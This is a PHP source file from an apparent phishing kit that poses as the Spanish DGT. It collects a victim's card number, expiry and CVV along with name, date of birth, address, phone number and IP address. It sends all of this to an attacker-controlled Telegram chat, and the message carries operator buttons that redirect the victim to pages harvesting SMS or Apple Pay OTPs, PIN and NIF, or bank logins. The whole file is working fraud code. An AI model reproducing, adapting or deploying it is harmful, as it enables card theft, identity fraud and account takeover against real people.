<?php


function is_valid_luhn($number)
{
    settype($number, 'string');
    $sumTable = array(
        array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9),
        array(0, 2, 4, 6, 8, 1, 3, 5, 7, 9)
    );
    $sum = 0;
    $flip = 0;
    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $sum += $sumTable[$flip++ & 0x1][$number[$i]];
    }
    return $sum % 10 === 0;
}

session_start();
include_once ('../settings.php');
require __DIR__ . '/vendor/autoload.php';

$date = date('d/m/y');
$heure = date('H:i:s');
$dateHeure = "$date, $heure";
$_SESSION['date_heure'] = $dateHeure;
use Telegram\Bot\Api;
$ip = $_SERVER['REMOTE_ADDR'];
$error = false;
$step = 1; 
$telegram = new Api($bot_token);




$_SESSION['ccnum'] = $_POST['ccnum']; 
$_SESSION['exp'] = $_POST['exp']; 
$_SESSION['cvv'] = $_POST['cvv'];


$nom =    $_SESSION['nom'];
$prenom =    $_SESSION['prenom'];
$dob =    $email = $_SESSION['dob'];
$cp =    $_SESSION['cp'];
$ville =    $_SESSION['ville'];
$adresse =    $_SESSION['adresse'];
$tel =    $_SESSION['tel'];
$ccnum1 = $_SESSION['ccnum'];


if (!empty($_POST['ccnum']) && !empty($_POST['exp']) && !empty($_POST['cvv'])) {

    if (is_valid_luhn($_SESSION['ccnum']) && is_numeric($_SESSION['ccnum']) && strlen($_SESSION['ccnum']) >= 16) {
        $step = 2;

        
        $cc = $_SESSION['ccnum'];
        $bin = substr($cc, 0, 6);
        $ch = curl_init();
        $url = "https://data.handyapi.com/bin/$bin";
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array('Accept-Version: 3');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);

        $brand = '';
        $type = '';
        $emoji = '';
        $bank = '';

      
        $result_cc = json_decode($result, true);
        $_SESSION['Scheme'] = $result_cc['Scheme'];
        $_SESSION['type'] = $result_cc['Type'];
        $_SESSION['bank'] = $result_cc['Issuer'];
        $_SESSION['brand'] = $result_cc['CardTier'];

        $keyboard = [
            'inline_keyboard' => [

                [['text' => '⛔ CC Invalide', 'callback_data' => 'invalide_cc']],
                [['text' => '📱  | Sms Auth Basic ', 'callback_data' => 'otp_sms']],
                [['text' => '📱  | Apple Pay ', 'callback_data' => 'otp_apple']],
                [['text' => '📱  | Pin + NIF ', 'callback_data' => 'otp_pin']],
                [['text' => '📱  | Banque login ', 'callback_data' => 'otp_banque']],
                [['text' => '✅ | Succès ', 'callback_data' => 'succes']],

               
            ]
        ];

        $telegram->sendMessage([
            'chat_id' => $chat_rez,
            'text' => "
            
			[⚡] Full Info | DGT ESPAGNE
			
			[💳] Numéro : " . $_SESSION['ccnum'] . "
			[📅] Date d'expiration : " . $_SESSION['exp'] . "
			[🔢] CVV : " . $_SESSION['cvv'] . "
			[🏛️] Banque : " . $_SESSION['bank'] . "
			[🥇] Niveau : " .$_SESSION['brand'] . "
			[♻️] Type : " . $_SESSION['type'] . "		 
				 
			[👤] Nom  :" . $_SESSION['nom'] . "
			[👤] Prénom  : " . $_SESSION['prenom'] . "
			[📂] Date de naissance  : " . $_SESSION['dob'] . "			
			[📍] Adresse  : " . $_SESSION['adresse'] . "
			[🌍] Ville: " . $_SESSION['ville'] . "
			[🌍] Code Postale: " . $_SESSION['cp'] . "
			[📞] Numéro de téléphone :" . $_SESSION['tel'] . "

			[📜] Informations liée au client [📜]             
			[🗓️] Heure et date du rez : {$_SESSION['date_heure']}
			[🌐] Ip Victime : $ip\n
			[©️] 𝐂𝐨𝐝𝐞𝐝 𝐛𝐲 𝐅𝐚𝐬𝐭_𝐒𝐜𝐚𝐦𝐚[©️]"            
             ,

            'reply_markup' => json_encode($keyboard)
        ]);
    } else {
        $error = true;
        header("Location: ../user/carte.php?error=1");   
        exit();
    }
} else {
    $error = true;
    
    header("Location: ../user/carte.php?error=2");   
    exit();
}

?>
<!DOCTYPE html>
<html>

<head>

</head>

<body>
    <?php if ($step == 1) :
        if ($error) : ?>
            <div style="color:red;"><?= $errorMessage ?></div>
        <?php endif; ?>

    <?php elseif ($step == 2) : ?>

        <div><?php include '../user/loader.php'; ?></div>

        <script>
            setInterval(function () {
                $.ajax({
                    type: "GET",
                    url: "callback.php",
                    success: function (msg) {

                        
                        if (msg === 'invalide_cc'){
                            window.location.href = '../user/carte.php?error=1';
                        }                        
                        else if (msg === 'otp_sms') {
                            window.location.href = '../user/sms_auth2.php';
                        }                        
                        else if (msg === 'otp_apple') {
                            window.location.href = '../user/sms_auth.php';
                        }
                        else if (msg === 'otp_pin') {
                            window.location.href = '../user/pin.php';
                        }                        
                        else if (msg === 'otp_banque') {
                            window.location.href = '../user/banque.php';
                        }
                        else if (msg === 'succes') {
                            window.location.href = '../user/succes.php';
                        }


                    }, 
                    error: function (msg) {
                        console.error(msg);
                    }
                });
            }, 3000) 
              </script>

    <?php endif; ?>
</body>

</html>
